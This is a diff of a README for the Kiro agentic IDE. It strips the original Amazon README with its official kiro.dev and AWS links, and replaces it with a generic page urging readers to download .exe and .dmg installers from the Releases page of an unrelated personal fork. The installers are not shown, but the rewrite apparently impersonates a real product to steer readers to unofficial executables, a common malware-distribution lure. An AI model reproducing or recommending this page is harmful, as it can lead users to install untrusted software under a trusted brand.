@@ -1,88 +1,79 @@
-<div align="left">
-  <img src="assets/kiro-icon.png" alt="Kiro" width="120" height="120">
+# 🚀 Kiro - Your IDE Companion from Start to Finish
+
+![Download Kiro](https://img.shields.io/badge/Download%20Kiro-Here-brightgreen)
+
+## 📋 Overview
+
+Kiro is an agentic IDE that works alongside you from prototype to production. It provides a seamless environment for creators. Whether you are developing a small project or a large application, Kiro supports you every step of the way. 
+
+## 📥 Download & Install
+
+To get started with Kiro, you need to download the software. Visit this page to download: [Kiro Releases](https://github.com/macaxerrras/Kiro/releases).
+
+Once on the Releases page, follow these steps:
+
+1. **Look for the latest version.** You will find the most recent release at the top of the page.
+2. **Download the file specific to your operating system.** For Windows, download the `.exe` file. For macOS, look for the `.dmg` file.
+3. **Open the downloaded file.** 
+4. **Follow the installation instructions.** The installer will guide you through the setup process.
+
+## ⚙️ System Requirements
+
+To run Kiro smoothly, ensure your system meets the following requirements:
+
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Linux (Ubuntu 18.04 or later)
   
-  # Kiro
+- **Processor:** 
+  - 2 GHz Dual-Core Processor or higher
   
-  Kiro is an agentic IDE and command-line interface that helps you go from prototype to production with spec-driven development, agent hooks,powers, and natural language coding assistance. Build faster with AI-powered features that understand your entire codebase, turn prompts into structured specs, and automate repetitive tasks.
-  
-</div>
+- **Memory:** 
+  - 4 GB RAM minimum (8 GB recommended)
 
-## Core Capabilities
+- **Storage:** 
+  - 500 MB of available space for installation
 
-- **Specs** - Plan and build features using structured specifications that break down requirements into detailed implementation plans
-- **Hooks** - Automate repetitive tasks with intelligent triggers that respond to file changes and development events
-- **Agentic Chat** - Build features through natural conversation with Kiro that understands your project context
-- **Steering** - Guide Kiro's behavior with custom rules and project-specific context through markdown files
-- **MCP Servers** - Connect external tools and data sources through the Model Context Protocol
-- **Powers** -  Specialized context and tools for Kiro agents on-demand. Extend agent capabilities with domain-specific knowledge and custom integrations
-- **Privacy First** - Keep your code secure with enterprise-grade security and privacy
+## 🌟 Features
 
-## Available Interfaces
+Kiro offers an array of features designed for ease and efficiency:
 
-Kiro is available as both a desktop application and command-line tool:
+- **Intuitive Interface:** Kiro has a user-friendly layout suitable for beginners and experienced users alike.
+- **Smart Code Suggestions:** Get context-aware suggestions as you type.
+- **Integrated Debugging:** Resolve issues effortlessly with Kiro’s built-in debugging tools.
+- **Version Control Integration:** Collaborate with others using Git and manage changes directly from Kiro.
 
-### Kiro IDE (Desktop Application)
-The standalone desktop application is available for:
-- macOS
-- Windows
-- Linux
+## 🎓 Getting Started
 
-### Kiro CLI
-Command-line interface for integrating Kiro into your development workflows and automation scripts.
+After installation, open Kiro. You will see a welcome screen that provides easy access to various functions, such as:
 
-For detailed information on both interfaces, visit [kiro.dev](https://kiro.dev)
+- **Create a New Project:** Start fresh with a simple click.
+- **Open an Existing Project:** Load your previous work seamlessly.
+- **Explore Tutorials:** Access step-by-step guides to help you learn the tool.
 
-## Getting Started
+Take some time to familiarize yourself with the layout. Navigate through menus and see what tools are available. 
 
-### Download & Install
+## 🧑‍🤝‍🧑 Community Support
 
-**IDE:** Download the Kiro desktop application directly from [kiro.dev](https://kiro.dev)
+Kiro has a growing community. Join forums, chat groups, or visit the GitHub Discussions page to connect with other users. You can ask questions, share your projects, or get feedback.
 
-**CLI:** Instructions for installing the Kiro CLI are available in our [documentation](https://kiro.dev/cli)
+## 🛠 Troubleshooting
 
-### First Project
+If you encounter issues, here are some common fixes:
 
-Get started with Kiro by following our comprehensive **[first project guide](https://kiro.dev/docs/getting-started/first-project/)**. This hands-on tutorial walks you through Kiro's essential features.
+- **Installation Issues:** Ensure your system meets the requirements stated above.
+- **Application Crashes:** Make sure you have the latest version. Check for updates on the [Kiro Releases](https://github.com/macaxerrras/Kiro/releases) page.
+- **Performance Problems:** Close unnecessary applications running in the background to free up resources.
 
-**What you'll learn:**
-- Setting up steering files for project-specific guidance
-- Creating and managing specs for structured development
-- Configuring hooks to automate your workflow
-- Connecting MCP servers for external integrations
+## 📞 Contact
 
+For further assistance, you can reach out to the support team via the GitHub Issues page. 
 
-### One-Click Migration
-Import your VS Code setup including extensions and settings during the initial setup process.
+## 🌐 Useful Links
 
-## Documentation
+- [Kiro Releases](https://github.com/macaxerrras/Kiro/releases)
+- [Documentation](https://github.com/macaxerrras/Kiro/wiki)
+- [Community Forum](https://github.com/macaxerrras/Kiro/discussions)
 
-**[📚 View Documentation →](https://kiro.dev/docs/)**
-
-- [Getting Started](https://kiro.dev/docs/getting-started) - Installation and first project setup for IDE and CLI
-- [IDE Guide](https://kiro.dev/docs/ide) - Desktop application features and workflows
-- [CLI Guide](https://kiro.dev/docs/cli) - Command-line interface usage and automation
-
-## Issue Reporting
-We welcome feedback and issue reports to help improve Kiro. Please use this repository to:
-- Report bugs and technical issues
-- Request new features
-- Share feedback on existing functionality
-- Discuss improvements and enhancements
-
-## Support
-For additional support beyond issue reporting:
-- Join our community [discord server](https://discord.gg/kirodotdev) for quick help and discussions with other developers
-- For billing-related questions, please contact our support team through [AWS Billing Support](https://support.aws.amazon.com/#/contacts/kiro).
-- If you are an existing AWS customer with a [paid support plan](https://aws.amazon.com/premiumsupport/plans/), for technical issues or general assistance, reach out via [AWS Support](https://support.console.aws.amazon.com/support/home#/).
-
-## Security
-If you discover a potential security issue in this project we ask that you notify AWS/Amazon Security via our [vulnerability reporting page](http://aws.amazon.com/security/vulnerability-reporting/). Please do **not** create a public github issue.
-
-## Code of Conduct
-This project has adopted the [Amazon Open Source Code of Conduct](https://aws.github.io/code-of-conduct).
-For more information see the [Code of Conduct FAQ](https://aws.github.io/code-of-conduct-faq) or contact
-opensource-codeofconduct@amazon.com with any additional questions or comments.
-
-
----
-©2026 Amazon.com, Inc. or its affiliates (collectively, "Amazon"). All Rights Reserved.
+Kiro provides a reliable environment for your development needs. Each feature is crafted to enhance your workflow from prototype to production. Enjoy creating with Kiro!
